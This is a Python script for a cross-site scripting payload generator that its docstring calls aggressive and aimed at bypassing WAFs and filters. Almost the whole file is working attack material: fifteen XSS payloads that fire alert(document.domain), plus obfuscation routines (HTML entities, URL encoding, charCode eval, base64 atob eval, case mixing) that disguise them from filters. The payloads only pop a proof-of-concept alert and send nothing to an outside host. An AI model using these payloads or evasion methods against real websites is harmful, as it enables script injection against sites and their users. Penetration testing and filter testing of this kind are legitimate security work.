import random
import base64
import urllib.parse

class XSSGenerator:
    """
    Aggressive XSS Payload Generator for Pentesting.
    Includes advanced bypass techniques for common WAFs and filters.
    """
    def __init__(self):
        self.base_payloads = [
            '<script>alert(document.domain)</script>',
            '<img src=x onerror=alert(document.domain)>',
            '<svg/onload=alert(document.domain)>',
            '"><script>alert(document.domain)</script>',
            '\'><script>alert(document.domain)</script>',
            'javascript:alert(document.domain)',
            '<details open ontoggle=alert(document.domain)>',
            '<video><source onerror=alert(document.domain)>',
            '<iframe src="javascript:alert(document.domain)">',
            '<math><mtext><option><fake><script>alert(document.domain)</script>',
            '<body onload=alert(document.domain)>',
            '<a href="javascript:alert(document.domain)">Click Me</a>',
            '<input type="image" src="x" onerror="alert(document.domain)">',
            '<isindex action="javascript:alert(document.domain)" type=image>',
            '<marquee onstart="alert(document.domain)">'
        ]
        self.obfuscation_techniques = [
            self._html_entity_encode,
            self._url_encode,
            self._string_concat,
            self._js_char_codes,
            self._base64_encode_js
        ]

    def _html_entity_encode(self, payload):
        """Encodes payload using HTML entities."""
        return ''.join([f'&#{ord(c)};' for c in payload])

    def _url_encode(self, payload):
        """URL encodes the payload."""
        return urllib.parse.quote(payload)

    def _string_concat(self, payload):
        """Obfuscates using string concatenation."""
        parts = [payload[i:i+random.randint(1, 3)] for i in range(0, len(payload), random.randint(1, 3))]
        return '"' + '"+"'.join(parts) + '"'

    def _js_char_codes(self, payload):
        """Obfuscates using JavaScript character codes."""
        return 'eval(String.fromCharCode(' + ','.join([str(ord(c)) for c in payload]) + '))'

    def _base64_encode_js(self, payload):
        """Base64 encodes the JavaScript part of the payload."""
        js_part = payload.replace('<script>', '').replace('</script>', '')
        b64_js = base64.b64encode(js_part.encode()).decode()
        return f'<script>eval(atob(\'{b64_js}\'))</script>'

    def generate_evasive_payloads(self, count=10):
        """Generates a list of evasive XSS payloads."""
        evasive_payloads = set()
        while len(evasive_payloads) < count:
            base = random.choice(self.base_payloads)
            obfuscator = random.choice(self.obfuscation_techniques)
            try:
                if obfuscator == self._base64_encode_js:
                    # Only apply base64 to script tags
                    if '<script>' in base and '</script>' in base:
                        evasive_payloads.add(obfuscator(base))
                    else:
                        evasive_payloads.add(base) # Add original if not a script tag
                else:
                    evasive_payloads.add(obfuscator(base))
            except Exception:
                # Fallback to original if obfuscation fails
                evasive_payloads.add(base)
            
            # Add some simple variations
            evasive_payloads.add(base.replace('script', 'sCrIpT'))
            evasive_payloads.add(base.replace('alert', 'confirm'))
            evasive_payloads.add(base.replace('alert', 'prompt'))

        return list(evasive_payloads)

if __name__ == "__main__":
    gen = XSSGenerator()
    print("--- Advanced Evasive XSS Payloads ---")
    for p in gen.generate_evasive_payloads(count=20):
        print(p)
